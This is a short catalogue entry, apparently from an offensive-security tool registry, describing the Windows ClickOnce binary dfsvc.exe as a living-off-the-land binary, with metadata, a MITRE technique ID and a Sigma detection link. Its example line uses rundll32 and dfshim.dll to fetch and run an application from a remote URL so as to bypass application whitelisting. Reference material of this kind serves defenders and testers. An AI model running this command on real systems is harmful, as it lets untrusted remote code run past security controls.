---
id: windows-bypass-dfsvc
namespace: windows:bypass:dfsvc
name: dfsvc
description: 'ClickOnce engine in Windows used by .NET Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.defense-evasion.bypass
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- dfsvc
parameters: []
features: []
execution:
  template: dfsvc
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host) (Use binary to bypass Application whitelisting)
  command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
references:
- label: ShmooCon-2015-Simple-WLEvasion.pdf
  url: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- label: clickonce-runtime-dfsvc-exe
  url: https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
techniques:
- defense-evasion
mitre_ids:
- T1127.002
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
install:
- method: choco
  package_name: dfsvc
  commands:
  - choco install dfsvc
---


# dfsvc

dfsvc is a Windows LOLBin. ClickOnce engine in Windows used by .NET Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe.
